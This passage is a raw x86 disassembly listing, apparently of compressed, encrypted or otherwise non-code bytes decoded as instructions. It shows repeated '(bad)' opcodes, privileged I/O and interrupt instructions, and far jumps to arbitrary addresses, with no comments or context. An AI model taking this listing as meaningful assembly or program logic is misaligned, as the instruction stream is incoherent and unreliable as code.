  40b07b:	push   edx
  40b07c:	and    al,0x6
  40b07e:	int    0xe2
  40b080:	test   eax,0x7e350c95
  40b085:	push   ds
  40b086:	idiv   DWORD PTR [edx]
  40b088:	jno    0x40b07d
  40b08a:	dec    ecx
  40b08b:	int    0x83
  40b08d:	jg     0xf7ccc76a
  40b093:	(bad)  
  40b094:	in     eax,0x55
  40b096:	fldl2t 
  40b098:	popf   
  40b099:	out    dx,al
  40b09a:	jb     0x40b0bb
  40b09c:	jecxz  0x40b09f
  40b09e:	fwait
  40b09f:	paddb  mm2,QWORD PTR [ecx-0xa5b5ce6]
  40b0a6:	popf   
  40b0a7:	scas   eax,DWORD PTR es:[edi]
  40b0a8:	cmp    bh,BYTE PTR [ebp+0x36569b87]
  40b0ae:	ss xchg edi,eax
  40b0b0:	add    ebp,DWORD PTR [esi+0x6b12dcb9]
  40b0b6:	repnz sbb esi,0x26eb527f
  40b0bd:	(bad)  
  40b0be:	ins    BYTE PTR es:[edi],dx
  40b0bf:	out    dx,eax
  40b0c0:	push   cs
  40b0c1:	clc    
  40b0c2:	xor    eax,0xb6a43df0
  40b0c7:	sar    esp,1
  40b0c9:	mov    edx,ebp
  40b0cb:	dec    DWORD PTR [ecx-0x78]
  40b0ce:	jge    0x40b085
  40b0d0:	icebp  
  40b0d1:	stos   BYTE PTR es:[edi],al
  40b0d2:	adc    BYTE PTR [ebp+edx*1-0x2596c068],al
  40b0d9:	jmp    FWORD PTR [eax+0x71]
  40b0dc:	in     al,dx
  40b0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0de:	inc    eax
  40b0df:	imul   esp,DWORD PTR [eax+0x3f],0x19
  40b0e3:	ret    0x2d9d
  40b0e6:	rcr    BYTE PTR [ecx-0xabebd42],cl
  40b0ec:	imul   edi,DWORD PTR [ebx+0x555fc84e],0xffffff97
  40b0f3:	loopne 0x40b0e0
  40b0f5:	pop    ecx
  40b0f6:	adc    DWORD PTR [ebx],edx
  40b0f8:	lods   al,BYTE PTR ds:[esi]
  40b0f9:	sbb    eax,0x9992639f
  40b0fe:	add    BYTE PTR [ebp-0x66b0c9b],0xb3
  40b105:	in     al,0xac
  40b107:	hlt    
  40b108:	or     DWORD PTR [esp],ebp
  40b10b:	(bad)  
  40b10c:	jmp    0x40b133
  40b10e:	and    al,0xec
  40b110:	out    0x75,eax
  40b112:	mov    dl,0xd2
  40b114:	fsub   DWORD PTR [ebx+eax*2]
  40b117:	jge    0x40b0ea
  40b119:	iret   
  40b11a:	push   esi
  40b11b:	fld    QWORD PTR [esi+0x3d]
  40b11e:	jmp    0x97457696
  40b123:	loope  0x40b140
  40b125:	mov    eax,ds:0x6cc78837
  40b12a:	xor    eax,0x857bced2
  40b12f:	pop    ss
  40b130:	mov    esp,0xb7358758
  40b135:	dec    eax
  40b136:	dec    esi
  40b137:	rol    DWORD PTR [ebp+0xbbf970a],1
  40b13d:	mov    edi,0x9cfb41f8
  40b142:	or     eax,0x64dc39e1
  40b147:	xchg   ebp,eax
  40b148:	and    ebx,ecx
  40b14a:	(bad)  
  40b14b:	lods   al,BYTE PTR ds:[esi]
  40b14c:	(bad)  
  40b14e:	jg     0x40b109
  40b150:	fstp   QWORD PTR [eax+edi*4]
  40b153:	push   ecx
  40b154:	mov    ch,BYTE PTR [ebp+0x602eac22]
  40b15a:	in     eax,dx
  40b15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b15c:	cmp    dh,BYTE PTR [ebp+0x58]
  40b15f:	jbe    0x40b143
  40b161:	pop    ds
  40b162:	fdivp  st(6),st
  40b164:	sub    BYTE PTR [edx-0x7fa23b92],bl
  40b16a:	dec    ebx
  40b16b:	lds    esp,FWORD PTR [edi-0x60]
  40b16e:	push   ss
  40b16f:	push   esp
  40b170:	push   esi
  40b171:	repz not BYTE PTR [ebx-0xd]
  40b175:	ins    BYTE PTR es:[edi],dx
  40b176:	mov    BYTE PTR [ebp-0x7e1a6c57],dl
  40b17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b17d:	xchg   edx,eax
  40b17e:	mov    ds:0xd2a5cb20,al
  40b183:	push   ebx
  40b184:	fldenv [edi]
  40b186:	jae    0x40b11a
  40b188:	adc    BYTE PTR [esi],dl
  40b18a:	out    dx,al
  40b18b:	add    cl,BYTE PTR ds:0xaf2441ca
  40b191:	retf   
  40b192:	fucomi st,st(0)
  40b194:	pop    es
  40b195:	xor    al,0xfb
  40b197:	pop    ebx
  40b198:	(bad)
  40b19c:	cmp    DWORD PTR [eax],ebx
  40b19e:	or     eax,esi
  40b1a0:	pop    DWORD PTR [esi+0x7e]
  40b1a3:	sbb    al,0x11
  40b1a5:	mov    cl,0x4f
  40b1a7:	pushf  
  40b1a8:	mov    edx,0xeaed1fe9
  40b1ad:	idiv   BYTE PTR [edx-0x551419b3]
  40b1b3:	sbb    BYTE PTR [eax+edi*2],cl
  40b1b6:	jae    0x40b19c
  40b1b8:	lea    ecx,[esi+0x4b]
  40b1bb:	enter  0x193d,0x6e
  40b1bf:	in     al,0x47
  40b1c1:	ret    
  40b1c2:	add    BYTE PTR [edx],0x1e
  40b1c5:	xchg   ecx,eax
  40b1c6:	jbe    0x40b1ad
  40b1c8:	enter  0xca5b,0x65
  40b1cc:	add    al,0x80
  40b1ce:	adc    al,0xd9
  40b1d0:	mov    ah,0xda
  40b1d2:	inc    ebp
  40b1d3:	jae    0x40b226
  40b1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d6:	inc    eax
  40b1d7:	add    eax,0x6d2a99a8
  40b1dc:	test   BYTE PTR [esi],ch
  40b1de:	push   esp
  40b1df:	ret    0x9e25
  40b1e2:	xchg   ecx,eax
  40b1e3:	inc    edi
  40b1e4:	xchg   ebx,eax
  40b1e5:	push   es
  40b1e6:	call   0x70e7:0x49747f60
  40b1ed:	mov    eax,0x7b8cb9bd
  40b1f2:	(bad)  
  40b1f3:	cmp    DWORD PTR [ebp+0x48d7d19b],ebx
  40b1f9:	jnp    0x40b243
  40b1fb:	not    DWORD PTR gs:[ecx+0x7d37f77e]
  40b202:	dec    eax
  40b203:	add    BYTE PTR [edi+edx*1],0x7
  40b207:	mov    ah,0x9a
  40b209:	popf   
  40b20a:	and    dl,BYTE PTR [ebx-0x7e]
  40b20d:	sbb    eax,0x28b29bb1
  40b212:	mov    edi,0xeed05525
  40b217:	mov    esi,0x5462ef08
  40b21c:	mov    edi,0x9b0ab375
  40b221:	rcpps  xmm5,xmm3
  40b224:	into   
  40b225:	rcr    BYTE PTR [ebx-0x2fe0715b],cl
  40b22b:	jl     0x40b1c6
  40b22d:	rcr    BYTE PTR [esi+0x799ca086],cl
  40b233:	out    0x45,al
  40b235:	loopne 0x40b216
  40b237:	push   0x38
  40b239:	cmp    al,0xb
  40b23b:	mov    bh,0x8c
  40b23d:	add    eax,0x7851c8ce
  40b242:	sar    BYTE PTR [ebp+0x2d],cl
  40b245:	xor    ebx,ebp
  40b247:	xchg   edx,eax
  40b248:	loopne 0x40b258
  40b24a:	or     al,0xfb
  40b24c:	xor    eax,0x7bd0e595
  40b251:	mov    ds:0x817434d5,eax
  40b256:	cmp    al,0x7
  40b258:	xchg   edx,eax
  40b259:	out    dx,eax
  40b25a:	cmp    al,0x8a
  40b25c:	inc    edx
  40b25d:	push   esi
  40b25e:	or     al,0x6a
  40b260:	and    edx,DWORD PTR [edx]
  40b262:	push   es
  40b263:	jecxz  0x40b2bf
  40b265:	cmp    DWORD PTR [eax],0x13
  40b268:	or     bl,BYTE PTR [ecx-0x37a58e03]
  40b26e:	pop    ds
  40b26f:	pop    ebp
  40b270:	sub    eax,0xd2c5d022
  40b275:	xchg   ebx,eax
  40b276:	sti    
  40b277:	jns    0x40b2ce
  40b279:	ins    DWORD PTR es:[edi],dx
  40b27a:	loope  0x40b220
  40b27c:	loopne 0x40b2a2
  40b27e:	cwde   
  40b27f:	adc    BYTE PTR [edi-0x36],bl
  40b282:	(bad)  
  40b283:	icebp  
  40b284:	in     al,0xbe
  40b286:	leave  
  40b287:	cmp    BYTE PTR [edi-0x515f0d65],ah
  40b28d:	mov    WORD PTR [esp+ecx*8],?
  40b290:	(bad)  
  40b291:	jmp    0x1b59f00b
  40b296:	loop   0x40b240
  40b298:	(bad)  
  40b299:	hlt    
  40b29a:	fs aas 
  40b29c:	jb     0x40b26f
  40b29e:	(bad)  
  40b29f:	pop    ss
  40b2a0:	popa   
  40b2a1:	pop    esp
  40b2a2:	jne    0x40b295
  40b2a4:	push   ecx
  40b2a5:	shl    bl,1
  40b2a7:	ror    dl,cl
  40b2a9:	rcr    DWORD PTR [ebp-0x11],0xb3
  40b2ad:	adc    BYTE PTR [ebp-0x5cdd8798],0xf9
  40b2b4:	cmp    al,0xcb
  40b2b6:	sub    edx,DWORD PTR [ebp+ebp*1+0x20]
  40b2ba:	test   al,0x84
  40b2bc:	ja     0x40b32e
  40b2be:	or     cl,BYTE PTR [ebx-0x2e751d2a]
  40b2c4:	push   ebx
  40b2c5:	lahf   
  40b2c6:	pop    ebp
  40b2c7:	push   edx
  40b2c8:	aas    
  40b2c9:	stos   BYTE PTR es:[edi],al
  40b2ca:	shr    dh,cl
  40b2cc:	bound  ecx,QWORD PTR cs:[edi]
  40b2cf:	xchg   DWORD PTR [ebx+eiz*2+0x10],edx
  40b2d3:	adc    DWORD PTR ds:[esi],0x36eae452
  40b2da:	pop    edx
  40b2db:	and    DWORD PTR [esi],edi
  40b2dd:	mov    eax,0x77006d24
  40b2e2:	jmp    0xb1644f92
  40b2e7:	ss out 0xeb,al
  40b2ea:	jo     0x40b31c
  40b2ec:	xlat   BYTE PTR ds:[ebx]
  40b2ed:	lock xchg ecx,eax
  40b2ef:	test   eax,0x3e18ba15
  40b2f4:	xor    eax,0xef235b08
  40b2f9:	mov    al,0xa
  40b2fb:	xchg   ecx,eax
  40b2fc:	or     edx,edx
  40b2fe:	dec    eax
  40b2ff:	(bad)  
  40b301:	or     al,0xa8
  40b303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b304:	dec    DWORD PTR [edx+0x0]
  40b307:	pop    ebp
  40b308:	int3   
  40b309:	jmp    0x957:0x79a6e530
  40b310:	cmc    
  40b311:	xchg   ebx,eax
  40b312:	in     al,0xb7
  40b314:	add    al,0xea
  40b316:	iret   
  40b317:	mov    bh,0xd
  40b319:	pop    edi
  40b31a:	int    0x45
  40b31c:	pop    ebx
  40b31d:	push   ebp
  40b31e:	nop
  40b31f:	aaa    
  40b320:	xlat   BYTE PTR ds:[ebx]
  40b321:	sbb    edx,DWORD PTR [eax]
  40b323:	ins    DWORD PTR es:[edi],dx
  40b324:	retf   0xa3d8
  40b327:	pop    eax
  40b328:	fisubr WORD PTR [ebx]
  40b32a:	pop    esp
  40b32b:	mov    al,0x1b
  40b32d:	jle    0x40b2c7
  40b32f:	fnstenv [ebp-0x7a]
  40b332:	jne    0x40b34f
  40b334:	ficom  WORD PTR [esi]
  40b336:	(bad)  
  40b337:	imul   esi,DWORD PTR [esi-0x5ff51d9b]
  40b33e:	pop    esp
  40b33f:	jo     0x40b3b4
  40b341:	jmp    0x7adcc7b9
  40b346:	sub    ecx,DWORD PTR [edi]
  40b348:	mov    bh,0xd4
  40b34a:	sub    bl,BYTE PTR [ebx-0x4def0ae8]
  40b350:	dec    ecx
  40b351:	imul   esp,DWORD PTR [eax-0x42c6a795],0xffffffea
  40b358:	pop    edx
  40b359:	ins    DWORD PTR es:[edi],dx
  40b35a:	rol    cl,cl
  40b35c:	and    edx,DWORD PTR [edx-0x7eb65690]
  40b362:	sahf   
  40b363:	jnp    0x40b33c
  40b365:	pop    eax
  40b366:	in     eax,dx
  40b367:	loopne 0x40b320
  40b369:	aaa    
  40b36a:	or     al,0x9c
  40b36c:	push   0xffffffc0
  40b36e:	sub    al,0x5d
  40b370:	push   edx
  40b371:	sub    BYTE PTR [edi-0x31f5a17c],0xc1
  40b378:	pop    edx
  40b379:	jle    0x40b3c6
  40b37b:	dec    edi
  40b37c:	jp     0x40b3b9
  40b37e:	int3   
  40b37f:	in     eax,dx
  40b380:	xor    dh,0xe6
  40b383:	into   
  40b384:	push   0x7b
  40b386:	loope  0x40b345
  40b388:	mov    DWORD PTR [esi],ecx
  40b38a:	xor    eax,0x3be8d541
  40b38f:	mov    eax,0xb07ddbb
  40b394:	jecxz  0x40b32f
  40b396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b397:	cdq    
  40b398:	loopne 0x40b3d3
  40b39a:	lds    ebx,FWORD PTR [edi-0x16]
  40b39d:	setg   BYTE PTR [ecx+0x71]
  40b3a1:	sub    DWORD PTR ds:0xef330bb0,ebx
  40b3a7:	(bad)  
  40b3a9:	popa   
  40b3aa:	mov    cl,0x90
  40b3ac:	shr    cl,0x6a
  40b3af:	test   BYTE PTR [eax-0x54727e1d],ch
  40b3b5:	cmp    al,0x85
  40b3b7:	ins    BYTE PTR es:[edi],dx
  40b3b8:	xchg   ebp,eax
  40b3b9:	adc    BYTE PTR [eax+0x679fe3d3],al
  40b3bf:	jns    0x40b3e6
  40b3c1:	mov    bl,ah
  40b3c3:	adc    bl,BYTE PTR [esi]
  40b3c5:	shr    DWORD PTR [edx+0x3b331d40],cl
  40b3cb:	cdq    
  40b3cc:	sti    
  40b3cd:	hlt    
  40b3ce:	jge    0x40b3b4
  40b3d0:	jmp    0x40b3db
  40b3d2:	data16 loopne 0x40b3c5
  40b3d5:	gs inc ebx
  40b3d7:	call   0xf91a:0xe13be75f
  40b3de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3df:	mov    al,ds:0x75c35f6f
  40b3e4:	loopne 0x40b402
  40b3e6:	or     ebx,DWORD PTR [ebx]
  40b3e8:	stos   DWORD PTR es:[edi],eax
  40b3e9:	mov    ch,0xbf
  40b3eb:	fimul  DWORD PTR [edx+0x1a635da3]
  40b3f1:	push   eax
  40b3f2:	push   esi
  40b3f3:	or     BYTE PTR [edx-0x335e2f56],ch
  40b3f9:	or     DWORD PTR [edi-0x7606015c],ebp
  40b3ff:	rol    DWORD PTR [edx-0x43],0x4a
  40b403:	ins    DWORD PTR es:[edi],dx
  40b404:	cs xchg esp,eax
  40b406:	jge    0x40b3a0
  40b408:	mov    esp,0xbded1265
  40b40d:	ret    0x9252
  40b410:	cwde   
  40b411:	pop    esp
  40b412:	sub    al,0xf
  40b414:	mov    eax,0xbb4a005f
  40b419:	mov    bl,0x5
  40b41b:	jmp    0x40b3fa
  40b41d:	pop    edx
  40b41e:	sbb    BYTE PTR [esi+ecx*8+0x18],0x22
  40b423:	sub    DWORD PTR [edx+0xccec7a],esp
  40b429:	and    BYTE PTR [ecx-0x53],bh
  40b42c:	mov    edi,0xc8e3bbb4
  40b431:	xchg   cl,bl
  40b433:	outs   dx,DWORD PTR ds:[esi]
  40b434:	int    0x4e
  40b436:	inc    ecx
  40b437:	icebp  
  40b438:	out    0x97,al
  40b43a:	mov    eax,0x78a93497
  40b43f:	mov    ebx,0xacaf9e
  40b444:	dec    esp
  40b445:	or     BYTE PTR [ebx+0x47ef0b84],0x5f
  40b44c:	mov    ebp,0x4fe56563
  40b451:	jnp    0x40b3d4
  40b453:	dec    esp
  40b454:	adc    DWORD PTR [edi+0x18],eax
  40b457:	les    ebx,FWORD PTR ds:0x51f6a85b
  40b45d:	mov    edi,0x657a60d7
  40b462:	push   esi
  40b463:	or     eax,0xeda9a33f
  40b468:	hlt    
  40b469:	dec    eax
  40b46a:	and    eax,0xd7f9afb9
  40b46f:	(bad)  
  40b470:	cdq    
  40b471:	mov    dl,0x1f
  40b473:	mov    es:0x2c2a2470,al
  40b479:	cmc    
  40b47a:	dec    ebx
  40b47b:	inc    ebp
  40b47c:	inc    esi
  40b47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b47e:	adc    eax,0x9ccae8b7
  40b483:	inc    ebp
  40b484:	push   ss
  40b485:	xor    DWORD PTR ds:0xf4f226ab,edx
  40b48b:	retf   
  40b48c:	sub    ecx,DWORD PTR [edx]
  40b48e:	lods   eax,DWORD PTR ds:[esi]
  40b48f:	in     eax,dx
  40b490:	or     al,BYTE PTR [edx+edi*1]
  40b493:	xchg   ecx,eax
  40b494:	faddp  st(7),st
  40b496:	jmp    0x40b47e
  40b498:	out    dx,eax
  40b499:	stc    
  40b49a:	sahf   
  40b49b:	enter  0x1bda,0x87
  40b49f:	fisubr WORD PTR [esi-0x4b639cec]
  40b4a5:	sbb    ch,BYTE PTR [esi]
  40b4a7:	and    edi,DWORD PTR [ebx+0x27]
  40b4aa:	pop    ss
  40b4ab:	dec    eax
  40b4ac:	pusha  
  40b4ad:	imul   esp,esi,0x76
  40b4b0:	and    eax,0x8e34b57f
  40b4b5:	(bad)  
  40b4b6:	and    eax,0x71234433
  40b4bb:	xor    DWORD PTR [edi+0x78a1e340],eax
  40b4c1:	loope  0x40b508
  40b4c3:	xlat   BYTE PTR ds:[ebx]
  40b4c4:	ins    DWORD PTR es:[edi],dx
  40b4c5:	dec    esi
  40b4c6:	in     eax,0xc2
  40b4c8:	adc    al,0xb3
  40b4ca:	fsub   st,st(2)
  40b4cc:	inc    esp
  40b4cd:	mov    edi,0x873fc3ff
  40b4d2:	pop    edi
  40b4d3:	fdiv   DWORD PTR [edi+ebp*1-0x47]
  40b4d7:	and    al,0xf9
  40b4da:	int    0x3f
  40b4dc:	scas   eax,DWORD PTR es:[edi]
  40b4dd:	aam    0x91
  40b4df:	inc    edx
  40b4e0:	stc    
  40b4e1:	aam    0xfc
  40b4e3:	fwait
  40b4e4:	lahf   
  40b4e5:	iret   
  40b4e6:	fidiv  WORD PTR [edx+0x35380116]
  40b4ec:	pusha  
  40b4ed:	(bad)  
  40b4ee:	aam    0x53
  40b4f0:	push   0xde281a52
  40b4f5:	in     al,dx
  40b4f6:	leave  
  40b4f7:	es jne 0x40b4d2
  40b4fa:	popa   
  40b4fb:	scas   al,BYTE PTR es:[edi]
  40b4fc:	adc    ebx,esi
  40b4fe:	mov    al,ds:0x7171e6f
  40b503:	popf   
  40b504:	pop    esp
  40b505:	(bad)  
  40b506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b507:	iret   
  40b508:	or     edx,0xbe162b8a
  40b50e:	addr16 gs pop esi
  40b511:	bndstx cs:[ebx+0x6b1d4d5c],(bad)
  40b519:	idiv   DWORD PTR [ecx]
  40b51b:	push   esp
  40b51c:	mov    dl,0x9
  40b51e:	and    eax,ebp
  40b520:	fcomp  st(4)
  40b522:	cmp    al,0x39
  40b524:	ds (bad) 
  40b526:	ficom  WORD PTR [ebp-0x2e]
  40b529:	das    
  40b52a:	sub    al,0x6b
  40b52c:	adc    ebp,0x38
  40b52f:	mov    edi,0x4a066c10
  40b534:	mov    esp,0x6a760c1c
  40b539:	and    BYTE PTR [edx+0x7d],al
  40b53c:	das    
  40b53d:	ret    0xb064
  40b540:	pop    ss
  40b541:	adc    edx,edx
  40b543:	mov    BYTE PTR [ebx-0x75431be],ah
  40b549:	sub    eax,0x26b3206e
  40b54e:	in     al,0x91
  40b550:	xor    al,0x91
  40b552:	mov    cl,0x52
  40b554:	or     al,0x4b
  40b556:	loope  0x40b512
  40b558:	sbb    eax,0x9fe48283
  40b55d:	int    0x11
  40b55f:	sbb    edx,DWORD PTR [ebx+0x65]
  40b562:	rol    dh,cl
  40b564:	pop    edx
  40b565:	mov    WORD PTR [ecx+0x7],?
  40b568:	push   ds
  40b569:	leave  
  40b56a:	(bad)  
  40b56b:	(bad)  
  40b56d:	and    eax,0x947e7e7c
  40b572:	(bad)  
  40b573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b574:	inc    ebx
  40b575:	out    dx,eax
  40b576:	xchg   ecx,eax
  40b577:	leave  
  40b578:	fdiv   DWORD PTR [ebp+0x33]
  40b57b:	adc    BYTE PTR [edi-0x7d589bc4],dh
  40b581:	call   0xd4f2:0xbd0bd6bc
  40b588:	mov    DWORD PTR [eax+edi*8],esi
  40b58b:	add    ebp,DWORD PTR [ebx+0x2cb5ea2b]
  40b591:	push   0xffffffa3
  40b593:	jae    0x40b56b
  40b595:	sbb    al,0x2
  40b597:	jns    0x40b5de
  40b599:	call   0xfa76468c
  40b59e:	nop
  40b59f:	std    
  40b5a0:	or     dh,dl
  40b5a2:	cmp    bh,BYTE PTR [esi+0x21]
  40b5a5:	xor    al,0xef
  40b5a7:	js     0x40b556
  40b5a9:	ins    BYTE PTR es:[edi],dx
  40b5aa:	(bad)  
  40b5ab:	or     dh,BYTE PTR [eax+0x71]
  40b5ae:	dec    edi
  40b5af:	mul    eax
  40b5b1:	pop    eax
  40b5b2:	jmp    0x726:0x884d221c
  40b5b9:	gs push eax
  40b5bb:	xor    DWORD PTR [esi+0xbdfa974],esp
  40b5c1:	xchg   ebp,eax
  40b5c2:	push   es
  40b5c3:	jle    0x40b58e
  40b5c5:	out    dx,al
  40b5c6:	push   0xffffffd3
  40b5c8:	mov    edx,0x91df050d
  40b5cd:	cdq    
  40b5ce:	pusha  
  40b5cf:	aad    0xed
  40b5d1:	inc    esi
  40b5d2:	sub    BYTE PTR [edx+0x3b],ah
  40b5d5:	mov    edx,0x9451f54b
  40b5da:	fnsave [ebp-0x8]
  40b5dd:	sub    bl,BYTE PTR [esi+eax*1-0x275f1acc]
  40b5e4:	in     eax,0xab
  40b5e6:	dec    ecx
  40b5e7:	je     0x40b5f9
  40b5e9:	jno    0x40b58c
  40b5eb:	sar    BYTE PTR [edx+0x1807259b],0xff
  40b5f2:	bound  esp,QWORD PTR [edx+edx*2-0x2f]
  40b5f6:	in     eax,dx
  40b5f7:	xor    al,0xfc
  40b5f9:	and    ch,BYTE PTR ds:0x25d42f99
  40b5ff:	jne    0x40b676
  40b601:	xchg   esp,eax
  40b602:	mov    ds:0xf0376e79,eax
  40b607:	shl    BYTE PTR [ebx],0xf1
  40b60a:	xlat   BYTE PTR ds:[ebx]
  40b60b:	loop   0x40b5f8
  40b60d:	fcomp  st(1)
  40b60f:	das    
  40b610:	icebp  
  40b611:	mov    bl,BYTE PTR [esi-0x21]
  40b614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b615:	xchg   edx,eax
  40b616:	sbb    DWORD PTR [edi],ebx
  40b618:	inc    eax
  40b619:	and    eax,0x48f2a806
  40b61e:	sub    eax,ebx
  40b620:	jns    0x40b5e6
  40b622:	hlt    
  40b623:	sbb    ch,BYTE PTR [esi-0x3a1d03c2]
  40b629:	and    bh,BYTE PTR [eax]
  40b62b:	pop    esi
  40b62c:	pushf  
  40b62d:	mov    ch,0x85
  40b62f:	or     bl,al
  40b631:	jmp    0x1834:0xd490e020
  40b638:	cli    
  40b639:	mov    cl,0x62
  40b63b:	loop   0x40b5d7
  40b63d:	add    eax,0xa328c362
  40b642:	push   eax
  40b643:	outs   dx,BYTE PTR ds:[esi]
  40b644:	mov    ebp,0x82b72fda
  40b649:	jbe    0x40b630
  40b64b:	fstp   DWORD PTR [edi-0x35]
  40b64e:	push   esp
  40b64f:	jmp    0x40b5f1
  40b651:	test   al,0xda
  40b653:	std    
  40b654:	faddp  st(0),st
  40b656:	jl     0x40b64f
  40b658:	ins    BYTE PTR es:[edi],dx
  40b659:	cmp    al,0x4a
  40b65b:	in     al,0xd3
  40b65d:	xor    al,0x76
  40b65f:	and    al,0x1f
  40b661:	aas    
  40b662:	push   ds
  40b663:	push   es
  40b664:	rcr    DWORD PTR [ebx-0x79],1
  40b667:	je     0x40b63a
  40b669:	mov    esi,0x2c3f4b11
  40b66e:	inc    ebp
  40b66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b670:	dec    esi
  40b671:	cdq    
  40b672:	iret   
  40b673:	mov    ebx,0x8f8994b9
  40b678:	out    dx,al
  40b679:	daa    
  40b67a:	and    eax,0x7b2e62d
  40b67f:	inc    ecx
  40b680:	pop    esi
  40b681:	int    0x70
  40b683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b685:	ss sbb eax,0xfac1bc9a
  40b68b:	or     BYTE PTR [ecx-0x306ee2aa],dl
  40b691:	cmp    ebp,DWORD PTR [edx+0x2b]
  40b694:	inc    esi
  40b695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b696:	out    dx,al
  40b697:	int    0xe9
  40b699:	(bad)  
  40b69a:	hlt    
  40b69b:	jecxz  0x40b6b4
  40b69d:	adc    esp,DWORD PTR [esi-0x5f152653]
  40b6a3:	sar    DWORD PTR [esi-0x61],1
  40b6a6:	les    edi,FWORD PTR [edi+0x8]
  40b6a9:	inc    ebx
  40b6aa:	jmp    0x40b6f8
  40b6ac:	adc    dh,ah
  40b6ae:	rol    DWORD PTR [eax+edx*4+0x726d5c56],0xd
  40b6b6:	stc    
  40b6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6b8:	shl    esi,cl
  40b6ba:	and    BYTE PTR [edi-0x38],ch
  40b6bd:	jo     0x40b666
  40b6bf:	or     BYTE PTR [eax+esi*1],0x24
  40b6c3:	ds cs xchg esp,eax
  40b6c6:	xchg   esi,eax
  40b6c7:	mov    ?,WORD PTR [edx]
  40b6c9:	adc    DWORD PTR [ebx+0x65],ebx
  40b6cc:	sbb    eax,0xc0b5bed5
  40b6d1:	pop    eax
  40b6d2:	sub    eax,0x64baaf2e
  40b6d7:	adc    edx,ebp
  40b6d9:	adc    eax,0x99365dde
  40b6de:	xchg   ecx,eax
  40b6df:	jb     0x40b70b
  40b6e1:	imul   esp,DWORD PTR [edx+0x61],0xffffffa1
  40b6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6e6:	push   0x8cc23687
  40b6eb:	outs   dx,DWORD PTR ds:[esi]
  40b6ec:	xchg   WORD PTR [ebp+0x22],si
  40b6f0:	lods   eax,DWORD PTR ds:[esi]
  40b6f1:	sahf   
  40b6f2:	ja     0x40b70a
  40b6f4:	(bad)  
  40b6f5:	jg     0x40b73a
  40b6f7:	pop    eax
  40b6f8:	(bad)  
  40b6fa:	mov    bl,0x33
  40b6fc:	test   DWORD PTR [ebp+0x74],0xbfa732b6
  40b703:	pushf  
  40b704:	leave  
  40b705:	sbb    ah,cl
  40b707:	cli    
  40b708:	inc    esi
  40b709:	xor    DWORD PTR [edx],eax
  40b70b:	xchg   esp,eax
  40b70c:	sub    DWORD PTR [eax-0x643e2b0e],edi
  40b712:	xor    al,BYTE PTR [ebp-0x45]
  40b715:	fisub  DWORD PTR [esi]
  40b717:	test   BYTE PTR [edx],al
  40b719:	xchg   ebp,ecx
  40b71b:	lock iret 
  40b71d:	ins    DWORD PTR es:[edi],dx
  40b71e:	fldenv [ebx-0x62491f84]
  40b724:	push   esp
  40b725:	mov    ds:0xb207a4e8,eax
  40b72a:	les    ebx,FWORD PTR [ebp-0x2a3e923a]
  40b730:	outs   dx,DWORD PTR ds:[esi]
  40b731:	push   0x1091a314
  40b736:	sbb    esi,DWORD PTR [ecx-0x302a4803]
  40b73c:	jge    0x40b798
  40b73e:	jae    0x40b71b
  40b740:	add    DWORD PTR [edi],ecx
  40b742:	jp     0x40b70e
  40b744:	aad    0x57
  40b746:	push   ds
  40b747:	inc    ebp
  40b748:	adc    edx,edi
  40b74a:	sar    DWORD PTR [ecx+0x3b],cl
  40b74d:	(bad)  
  40b74e:	in     eax,0x93
  40b750:	sub    cl,BYTE PTR [edi]
  40b752:	iret   
  40b753:	outs   dx,BYTE PTR ds:[esi]
  40b754:	mov    ds:0xcf980eb5,al
  40b759:	mov    ecx,0x86026283
  40b75e:	scas   al,BYTE PTR es:[edi]
  40b75f:	xor    eax,0x60da5279
  40b764:	dec    esi
  40b765:	cmp    esp,eax
  40b767:	dec    esi
  40b768:	imul   esp,DWORD PTR [ecx+0x21a8073c],0xd28b188d
  40b772:	mov    bl,0xf4
  40b774:	cli    
  40b775:	xchg   ebx,eax
  40b776:	imul   ebp,DWORD PTR [ebx-0x64],0xffffffbd
  40b77a:	mov    edi,0x43a6dbfd
  40b77f:	cmp    al,0x5a
  40b781:	push   ebp
  40b782:	iret   
  40b783:	gs sbb ah,dh
  40b786:	pop    es
  40b787:	add    DWORD PTR [esp+edi*8-0x2ebd827b],esp
  40b78e:	ss sub cl,0x6d
  40b792:	push   ebp
  40b793:	and    al,0x1
  40b795:	adc    DWORD PTR [eax+0x10b82a43],esp
  40b79b:	push   ecx
  40b79c:	adc    eax,0x3fed87af
  40b7a1:	push   edi
  40b7a2:	xchg   esp,eax
  40b7a3:	jnp    0x40b7d0
  40b7a5:	add    eax,0x346b6bcc
  40b7aa:	pop    ecx
  40b7ab:	lea    ecx,[esp+eiz*8]
  40b7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7af:	ins    BYTE PTR es:[edi],dx
  40b7b0:	xor    al,0x3d
  40b7b2:	cmp    dh,dl
  40b7b4:	mov    dh,0x4f
  40b7b6:	or     bh,BYTE PTR [esi+0x785d9bbe]
  40b7bc:	call   0x36e:0x564955a6
  40b7c3:	cmp    edi,DWORD PTR [ecx+0x6a4c58c3]
  40b7c9:	pusha  
  40b7ca:	push   eax
  40b7cb:	les    edi,FWORD PTR [eax+0x75]
  40b7ce:	adc    DWORD PTR [ebp-0x6a3ddfaa],ebp
  40b7d4:	sti    
  40b7d5:	jno    0x40b78e
  40b7d7:	xor    cl,0x56
  40b7da:	das    
  40b7db:	popa   
  40b7dc:	add    BYTE PTR [ebx+0x252b47f3],ah
  40b7e2:	dec    eax
  40b7e3:	(bad)  
  40b7e4:	cmp    eax,0x44dea966
